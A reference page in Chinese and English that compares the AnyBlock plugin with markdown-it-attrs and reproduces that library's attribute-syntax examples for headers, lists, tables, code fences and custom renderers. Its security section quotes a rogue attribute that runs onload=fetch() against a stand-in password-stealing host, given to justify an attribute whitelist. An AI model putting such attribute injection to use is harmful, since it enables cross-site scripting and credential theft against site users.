# Markdown-it-attrs参考

## 比较

后来发现，插件行为和 Markdonw-it-attrs 挺像的，都是对一个区域进行额外标注

区别在于：

- AnyBlock 更倾向于标注块而不是内联
- AnyBlock 不仅仅进行标注，还内置了许多处理器可以用于改变dom结构
- AnyBlock 对Obsidian更友好

## Markdown-it-attrs 主要功能

### header 标题

Example input:
```md
# header {.style-me}
paragraph {data-toggle=modal}
```

Output:
```html
<h1 class="style-me">header</h1>
<p data-toggle="modal">paragraph</p>
```

### inline 内联元素

Works with inline elements too:
```md
paragraph *style me*{.red} more text
```

Output:
```html
<p>paragraph <em class="red">style me</em> more text</p>
```

### 代码块

And fenced code blocks:
<pre><code>
```python {data=asdf}
nums = [x for x in range(10)]
```
</code></pre>

Output:
```html
<pre><code data="asdf" class="language-python">
nums = [x for x in range(10)]
</code></pre>
```

### 列表元素

If you need the class to apply to the `<ul>` element, use a new line:
```md
- list item **bold**
{.red}
```

Output:
```html
<ul class="red">
<li>list item <strong>bold</strong></li>
</ul>
```

If you have nested lists, curlys after new lines will apply to the nearest `<ul>` or `<ol>`. You may force it to apply to the outer `<ul>` by adding curly below on a paragraph by its own:
```md
- item
  - nested item {.a}
{.b}

{.c}
```

Output:
```html
<ul class="c">
  <li>item
    <ul class="b">
      <li class="a">nested item</li>
    </ul>
  </li>
</ul>
```

### 表格元素

This is not optimal, but what I can do at the momemnt. For further discussion, see https://github.com/arve0/markdown-it-attrs/issues/32.

Similar for tables, attributes must be _two_ new lines below:
```md
header1 | header2
------- | -------
column1 | column2

{.special}
```

Output:
```html
<table class="special">
  <thead>
    <tr>
      <th>header1</th>
      <th>header2</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>column1</td>
      <td>column2</td>
    </tr>
  </tbody>
</table>
```

Wellformed the table's _rowspan_ and/or _colspan_ attributes, usage sample below:
```md
| A                       | B   | C   | D                |
| ----------------------- | --- | --- | ---------------- |
| 1                       | 11  | 111 | 1111 {rowspan=3} |
| 2 {colspan=2 rowspan=2} | 22  | 222 | 2222             |
| 3                       | 33  | 333 | 3333             |

{border=1}
```

Output:
```html
<table border="1">
  <thead>
    <tr>
      <th>A</th>
      <th>B</th>
      <th>C</th>
      <th>D</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>11</td>
      <td>111</td>
      <td rowspan="3">1111</td>
    </tr>
    <tr>
      <td colspan="2" rowspan="2">2</td>
      <td>22</td>
    </tr>
    <tr>
      <td>3</td>
    </tr>
  </tbody>
</table>
```

If you need finer control, [decorate](https://github.com/rstacruz/markdown-it-decorate) might help you.

## 功能

### 允许语法糖

You can use `..` as a short-hand for `css-module=`:

```md
Use the css-module green on this paragraph. {..green}
```

Output:
```html
<p css-module="green">Use the css-module green on this paragraph.</p>
```

### 允许修改标识符号

Also works with spans, in combination with the [markdown-it-bracketed-spans](https://github.com/mb21/markdown-it-bracketed-spans) plugin (to be installed and loaded as such then):

```md
paragraph with [a style me span]{.red}
```

Output:
```html
<p>paragraph with <span class="red">a style me span</span></p>
```

### 允许白名单 (安全性)

A user may insert rogue attributes like this:
```js
![](img.png){onload=fetch('https://imstealingyourpasswords.com/script.js').then(...)}
```

If security is a concern, use an attribute whitelist:

```js
md.use(markdownItAttrs, {
  allowedAttributes: ['id', 'class', /^regex.*$/]
});
```

Now only `id`, `class` and attributes beginning with `regex` are allowed:

```md
text {#red .green regex=allowed onclick=alert('hello')}
```

Output:
```html
<p id="red" class="green" regex="allowed">text</p>
```

### 特殊符号限制

markdown-it-attrs relies on markdown parsing in markdown-it, which means some
special cases are not possible to fix. Like using `_` outside and inside
attributes:

```md
_i want [all of this](/link){target="_blank"} to be italics_
```

Above example will render to:
```html
<p>_i want <a href="/link">all of this</a>{target=&quot;<em>blank&quot;} to be italics</em></p>
```

...which is probably not what you wanted. Of course, you could use `*` for
italics to solve this parsing issue:

```md
*i want [all of this](/link){target="_blank"} to be italics*
```

Output:
```html
<p><em>i want <a href="/link" target="_blank">all of this</a> to be italics</em></p>
```

### 模糊性、优先级

当类可应用于内联元素或块级元素时，内联元素将优先生效：
```md
- list item **bold**{.red}
```

Output:
```html
<ul>
<li>list item <strong class="red">bold</strong></li>
<ul>
```

如果您希望该类别应用于列表项中，请使用空格：
```md
- list item **bold** {.red}
```

Output:
```html
<ul>
<li class="red">list item <strong>bold</strong></li>
</ul>
```

## 自定义

### 自定义渲染

如果您需要其他输出结果，可以自行更改渲染器设置：

```js
const md = require('markdown-it')();
const markdownItAttrs = require('markdown-it-attrs');

md.use(markdownItAttrs);

// custom renderer for fences
md.renderer.rules.fence = function (tokens, idx, options, env, slf) {
  const token = tokens[idx];
  return  '<pre' + slf.renderAttrs(token) + '>'
    + '<code>' + token.content + '</code>'
    + '</pre>';
}

let src = [
  '',
  '```js {.abcd}',
  'var a = 1;',
  '```'
].join('\n')

console.log(md.render(src));
```

Output:
```html
<pre class="abcd"><code>var a = 1;
</code></pre>
```

Read more about [custom rendering at markdown-it](https://github.com/markdown-it/markdown-it/blob/master/docs/architecture.md#renderer).


### 自定义块

`markdown-it-attrs` will add attributes to any `token.block == true` with {}-curlies in end of `token.info`. For example, see [markdown-it/rules_block/fence.js](https://github.com/markdown-it/markdown-it/blob/760050edcb7607f70a855c97a087ad287b653d61/lib/rules_block/fence.js#L85) which [stores text after the three backticks in fenced code blocks to `token.info`](https://markdown-it.github.io/#md3=%7B%22source%22%3A%22%60%60%60js%20%7B.red%7D%5Cnfunction%20%28%29%20%7B%7D%5Cn%60%60%60%22%2C%22defaults%22%3A%7B%22html%22%3Afalse%2C%22xhtmlOut%22%3Afalse%2C%22breaks%22%3Afalse%2C%22langPrefix%22%3A%22language-%22%2C%22linkify%22%3Atrue%2C%22typographer%22%3Atrue%2C%22_highlight%22%3Atrue%2C%22_strict%22%3Afalse%2C%22_view%22%3A%22debug%22%7D%7D).

Remember to [render attributes](https://github.com/arve0/markdown-it-attrs/blob/a75102ad571110659ce9545d184aa5658d2b4a06/index.js#L100) if you use a custom renderer.

### 自定义分隔符

To use different delimiters than the default, add configuration for `leftDelimiter` and `rightDelimiter`:

```js
md.use(attrs, {
  leftDelimiter: '[',
  rightDelimiter: ']'
});
```

Which will render

```md
# title [.large]
```

as

```html
<h1 class="large">title</h1>
```
